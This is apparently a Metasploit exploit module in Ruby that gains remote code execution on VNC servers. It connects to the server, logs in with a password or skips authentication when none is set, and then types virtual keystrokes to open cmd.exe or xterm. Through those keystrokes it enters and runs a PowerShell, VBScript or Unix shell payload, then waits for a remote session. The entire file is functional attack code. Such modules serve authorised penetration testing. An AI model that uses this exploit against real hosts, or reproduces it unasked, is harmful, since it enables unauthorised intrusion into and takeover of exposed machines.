##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
require 'rex/proto/rfb'
 
class Metasploit3 < Msf::Exploit::Remote
 
  Rank = GreatRanking
  WINDOWS_KEY = "\xff\xeb"
  ENTER_KEY = "\xff\x0d"
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell
 
  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'VNC Keyboard Remote Code Execution',
      'Description'     => %q{
        This module exploits VNC servers by sending virtual keyboard keys and executing
        a payload. On Windows systems a command prompt is opened and a PowerShell or CMDStager
        payload is typed and executed. On Unix/Linux systems a xterm terminal is opened
        and a payload is typed and executed.
      },
      'Author'          => [ 'xistence <xistence[at]0x90.nl>' ],
      'Privileged'      => false,
      'License'         => MSF_LICENSE,
      'Platform'       => %w{ win unix },
      'Targets'         =>
        [
          [ 'VNC Windows / Powershell', { 'Arch' => ARCH_X86, 'Platform' => 'win' } ],
          [ 'VNC Windows / VBScript CMDStager', { 'Platform' => 'win' } ],
          [ 'VNC Linux / Unix', { 'Arch' => ARCH_CMD, 'Platform' => 'unix' } ]
        ],
      'References'     =>
        [
          [ 'URL', 'http://www.jedi.be/blog/2010/08/29/sending-keystrokes-to-your-virtual-machines-using-X-vnc-rdp-or-native/']
        ],
      'DisclosureDate'  => 'Jul 10 2015',
      'DefaultTarget'   => 0))
 
    register_options(
      [
        Opt::RPORT(5900),
        OptString.new('PASSWORD', [ false, 'The VNC password']),
        OptInt.new('TIME_WAIT', [ true, 'Time to wait for payload to be executed', 20])
      ], self.class)
  end
 
 
  def press_key(key)
    keyboard_key = "\x04\x01" # Press key
    keyboard_key << "\x00\x00\x00\x00" # Unknown / Unused data
    keyboard_key << key # The keyboard key
    # Press the keyboard key. Note: No receive is done as everything is sent in one long data stream
    sock.put(keyboard_key)
  end
 
 
  def release_key(key)
    keyboard_key = "\x04\x00" # Release key
    keyboard_key << "\x00\x00\x00\x00" # Unknown / Unused data
    keyboard_key << key # The keyboard key
    # Release the keyboard key. Note: No receive is done as everything is sent in one long data stream
    sock.put(keyboard_key)
  end
 
 
  def exec_command(command)
    values = command.chars.to_a
    values.each do |value|
      press_key("\x00#{value}")
      release_key("\x00#{value}")
    end
    press_key(ENTER_KEY)
  end
 
 
  def start_cmd_prompt
    print_status("#{rhost}:#{rport} - Opening Run command")
    # Pressing and holding windows key for 1 second
    press_key(WINDOWS_KEY)
    Rex.select(nil, nil, nil, 1)
    # Press the "r" key
    press_key("\x00r")
    # Now we can release both keys again
    release_key("\x00r")
    release_key(WINDOWS_KEY)
    # Wait a second to open run command window
    select(nil, nil, nil, 1)
    exec_command('cmd.exe')
    # Wait a second for cmd.exe prompt to open
    Rex.select(nil, nil, nil, 1)
  end
 
 
  def exploit
 
    begin
      alt_key = "\xff\xe9"
      f2_key = "\xff\xbf"
      password = datastore['PASSWORD']
 
      connect
      vnc = Rex::Proto::RFB::Client.new(sock, :allow_none => false)
 
      unless vnc.handshake
        fail_with(Failure::Unknown, "#{rhost}:#{rport} - VNC Handshake failed: #{vnc.error}")
      end
 
      if password.nil?
        print_status("#{rhost}:#{rport} - Bypass authentication")
        # The following byte is sent in case the VNC server end doesn't require authentication (empty password)
        sock.put("\x10")
      else
        print_status("#{rhost}:#{rport} - Trying to authenticate against VNC server")
        if vnc.authenticate(password)
          print_status("#{rhost}:#{rport} - Authenticated")
        else
          fail_with(Failure::NoAccess, "#{rhost}:#{rport} - VNC Authentication failed: #{vnc.error}")
        end
      end
 
      # Send shared desktop
      unless vnc.send_client_init
        fail_with(Failure::Unknown, "#{rhost}:#{rport} - VNC client init failed: #{vnc.error}")
      end
 
      if target.name =~ /VBScript CMDStager/
        start_cmd_prompt
        print_status("#{rhost}:#{rport} - Typing and executing payload")
        execute_cmdstager({:flavor => :vbs, :linemax => 8100})
        # Exit the CMD prompt
        exec_command('exit')
      elsif target.name =~ /Powershell/
        start_cmd_prompt
        print_status("#{rhost}:#{rport} - Typing and executing payload")
        command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encode_final_payload: true})
        # Execute powershell payload and make sure we exit our CMD prompt
        exec_command("#{command} && exit")
      elsif target.name =~ /Linux/
        print_status("#{rhost}:#{rport} - Opening 'Run Application'")
        # Press the ALT key and hold it for a second
        press_key(alt_key)
        Rex.select(nil, nil, nil, 1)
        # Press F2 to start up "Run application"
        press_key(f2_key)
        # Release ALT + F2
        release_key(alt_key)
        release_key(f2_key)
        # Wait a second for "Run application" to start
        Rex.select(nil, nil, nil, 1)
        # Start a xterm window
        print_status("#{rhost}:#{rport} - Opening xterm")
        exec_command('xterm')
        # Wait a second for "xterm" to start
        Rex.select(nil, nil, nil, 1)
        # Execute our payload and exit (close) the xterm window
        print_status("#{rhost}:#{rport} - Typing and executing payload")
        exec_command("nohup #{payload.encoded} &")
        exec_command('exit')
      end
 
      print_status("#{rhost}:#{rport} - Waiting for session...")
      (datastore['TIME_WAIT']).times do
        Rex.sleep(1)
 
        # Success! session is here!
        break if session_created?
      end
 
    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout => e
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - #{e.message}")
    ensure
      disconnect
    end
  end
 
  def execute_command(cmd, opts = {})
    exec_command(cmd)
  end
 
end
